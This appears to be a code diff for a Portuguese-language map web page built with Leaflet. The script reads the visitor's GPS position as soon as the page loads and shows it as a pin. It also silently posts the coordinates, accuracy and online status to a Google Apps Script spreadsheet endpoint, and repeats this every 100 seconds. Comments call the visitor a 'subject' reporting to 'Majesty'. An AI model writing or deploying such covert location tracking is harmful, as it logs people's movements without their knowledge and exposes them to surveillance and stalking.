@@ -1,34 +1,80 @@
-navigator.geolocation.getCurrentPosition(function(position) {
+$(document).ready(function () {
 
-    var lat = position.coords.latitude;
-    var lng = position.coords.longitude;
+    // MAPA DO TERRITÓRIO REAL
+    var map = L.map('map', {
+        scrollWheelZoom: false
+    }).setView([-23.4866, -46.3487], 16);
 
-    // Cria o marcador no mapa
-    var marker = L.marker([lat, lng])
-        .addTo(map)
-        .bindPopup("SEU LOCAL")
-        .openPopup();
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        maxZoom: 19
+    }).addTo(map);
 
-    map.setView([lat, lng], 17);
+    // FUNÇÃO PARA CAPTURAR E ENVIAR OS DADOS DO SÚDITO
+    function capturarLocalizacaoReal() {
+        if (!navigator.geolocation) {
+            console.error("Alerta Real: Este navegador é indigno e não possui GPS.");
+            return;
+        }
 
-    // AGORA pegamos exatamente do pin
-    var pinLat = marker.getLatLng().lat;
-    var pinLng = marker.getLatLng().lng;
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                // Coordenadas reais do GPS
+                var lat = position.coords.latitude;
+                var lng = position.coords.longitude;
 
-    // Envia para a planilha
-    const dados = {
-        timestamp: new Date().toISOString(),
-        latitude: pinLat,
-        longitude: pinLng,
-        precisao: position.coords.accuracy,
-        status: navigator.onLine ? 'online' : 'offline'
-    };
+                // Marker e popup permanecem para visualização
+                var marker = L.marker([lat, lng])
+                    .addTo(map)
+                    .bindPopup("SEU LOCAL")
+                    .openPopup();
 
-    fetch('https://script.google.com/macros/s/AKfycbz6bm4rqeA6_88ztbBVwr_JnQFBmVdsA8Gz9p1pK9heomd9-HFge8Ny6VPF30I5H57LQQ/exec', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(dados)
-    });
+                // Centraliza mapa na posição do marker
+                map.setView([lat, lng], 17);
+
+                // PEGAMOS EXATAMENTE DO PIN
+                var pinLat = marker.getLatLng().lat;
+                var pinLng = marker.getLatLng().lng;
+
+                // Envio direto para o Google Sheets
+                const dados = {
+                    timestamp: new Date().toISOString(),
+                    latitude: pinLat,
+                    longitude: pinLng,
+                    precisao: position.coords.accuracy,
+                    status: navigator.onLine ? 'online' : 'offline'
+                };
+
+                fetch('SUA_URL_DO_APPS_SCRIPT_AQUI', {
+                    method: 'POST',
+                    mode: 'no-cors', // evita CORS
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(dados)
+                }).then(() => console.log("Dados do pin enviados com sucesso."));
+
+            },
+            function(error) {
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        console.error("O súdito negou o acesso à localização, Majestade!");
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        console.error("O sinal de GPS está fraco nas fronteiras.");
+                        break;
+                    case error.TIMEOUT:
+                        console.error("A requisição expirou no tempo de espera real.");
+                        break;
+                    default:
+                        console.error("Erro desconhecido na geolocalização.");
+                }
+            },
+            { enableHighAccuracy: true, timeout: 10000 } // máxima precisão
+        );
+    }
+
+    // DISPARO AUTOMÁTICO AO CARREGAR A PÁGINA
+    capturarLocalizacaoReal();
+
+    // RASTREIO CONTÍNUO A CADA 100 SEGUNDOS
+    setInterval(capturarLocalizacaoReal, 100000);
 
 });
